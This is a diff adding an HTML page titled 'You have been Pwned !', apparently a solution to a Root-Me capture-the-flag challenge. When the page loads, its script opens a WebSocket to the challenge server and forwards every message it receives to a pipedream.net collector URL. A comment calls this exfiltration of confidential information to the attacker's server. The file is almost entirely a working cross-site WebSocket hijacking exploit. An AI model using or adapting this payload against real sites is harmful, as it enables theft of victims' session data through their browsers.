@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>You have been Pwned !</title>
+</head>
+<body>
+
+</body>
+<script>
+	websocket = new WebSocket('ws://challenge01.root-me.org:58036/ws')
+	websocket.onopen = function () {
+	  websocket.send("hello");
+	}
+	websocket.onmessage = function (event) {
+	  //Exfiltrate the confidential information to attackers server
+	  fetch('https://en9cw0xb6pcg6wl.m.pipedream.net/?'+event.data, {mode: 'no-cors'})
+	}	
+</script>
+</html>
